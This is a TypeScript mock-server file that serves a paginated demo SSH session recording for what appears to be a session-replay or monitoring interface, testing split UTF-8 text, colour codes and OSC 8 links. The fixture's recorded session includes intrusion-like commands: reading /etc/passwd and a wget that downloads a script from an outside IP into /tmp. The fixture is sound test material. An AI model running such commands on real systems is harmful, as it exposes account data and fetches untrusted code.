import { http, HttpResponse } from 'msw';
import type { ReplayChunk } from '../features/replay/tape';

/** Сессия из фикстуры событий — для неё есть запись в моке. */
export const DEMO_SESSION = '00000000-0000-0000-0000-0000005e5510';

const enc = new TextEncoder();
const b64 = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes));

/**
 * Демо-запись SSH-сессии по ReplayChunkV1: русский текст разрезан посреди
 * символа, есть цвет и гиперссылка OSC 8 (должны исчезнуть) и разрыв.
 */
function demoChunks(): ReplayChunk[] {
  const parts: [number, 'in' | 'out', string | Uint8Array, boolean?][] = [
    [0, 'out', 'Welcome to Ubuntu 22.04.4 LTS\r\n\u001b[32mroot@web-01\u001b[0m:~# '],
    [1800, 'in', 'whoami\r'],
    [1900, 'out', '\r\nroot\r\nroot@web-01:~# '],
    [4200, 'in', 'cat /etc/passwd | head -3\r'],
    [4300, 'out', '\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\r\n'],
    [4310, 'out', 'bin:x:2:2::/bin:/usr/sbin/nologin\r\nroot@web-01:~# '],
    [7000, 'in', 'wget http://203.0.113.9/x.sh -O /tmp/x.sh\r'],
    [7400, 'out', enc.encode('\r\nСохранение в: «/tmp/x.sh»').slice(0, 9)],
    [7410, 'out', enc.encode('\r\nСохранение в: «/tmp/x.sh»').slice(9)],
    [7450, 'out', '\r\n\u001b]8;;http://203.0.113.9\u0007ссылка\u001b]8;;\u0007 загружена\r\n', true],
    [9800, 'out', 'root@web-01:~# '],
    [11000, 'in', 'exit\r'],
    [11050, 'out', '\r\nlogout\r\n'],
  ];
  return parts.map(([offset_ms, direction, data, truncated], seq) => ({
    seq, offset_ms, direction, truncated: truncated ?? false,
    data_base64: b64(typeof data === 'string' ? enc.encode(data) : data),
  }));
}

export const replayHandlers = [
  // Курсор мока — номер следующего seq; чужой формат — 422, как у центра.
  http.get('/api/v1/sessions/:id/replay', ({ params, request }) => {
    if (params.id !== DEMO_SESSION) return HttpResponse.json({ detail: 'Запись не найдена' }, { status: 404 });
    const q = new URL(request.url).searchParams;
    const after = q.get('after');
    if (after !== null && !/^r\d+$/.test(after)) return HttpResponse.json({ detail: 'Некорректный курсор' }, { status: 422 });
    const limit = Math.min(Math.max(Number(q.get('limit') ?? 200) || 200, 1), 500);
    const all = demoChunks();
    const start = after === null ? 0 : Number(after.slice(1)) + 1;
    const chunks = all.slice(start, start + limit);
    const last = chunks.at(-1);
    return HttpResponse.json({
      session_id: DEMO_SESSION, started_at: '2026-10-10T09:41:12Z', chunks,
      next_cursor: start + limit < all.length && last ? `r${last.seq}` : null,
      tail_cursor: `r${all.length - 1}`, complete: true,
    });
  }),
];
